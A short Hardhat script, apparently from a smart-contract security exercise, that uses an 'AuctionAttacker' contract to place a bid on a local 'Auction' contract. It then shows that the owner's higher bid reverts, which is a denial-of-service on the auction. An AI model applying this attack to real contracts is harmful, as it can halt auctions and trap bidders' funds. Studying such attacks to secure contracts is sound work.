require("@nomiclabs/hardhat-ethers");
const { ethers } = require("hardhat");

async function interact() {
    [owner, user1] = await ethers.getSigners();

    let auctionAddress = "0x5FbDB2315678afecb367f032d93F642f64180aa3"
    let auctionContract = await ethers.getContractAt("Auction", auctionAddress)

    let attackerAddress = "0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512"
    let attackerContract = await ethers.getContractAt("AuctionAttacker", attackerAddress)

    // Step 1
    // Call bid on attackerContract from user1 to send the initial ETH in the Auction contract
    let overwrite = {
        value: 3e5
    }
    let initialBid = await attackerContract.connect(user1).bid(auctionAddress, overwrite)
    await initialBid.wait()

    // Step 2
    // Call from the owner to outbid the first bidder, which revert
    overwrite.value = 4e5
    let userBid = await auctionContract.connect(owner).bid(overwrite)
    await userBid.wait()
}

interact()
    .then(() => process.exit(0))
    .catch(error => {
        console.error(error);
        process.exit(1);
    });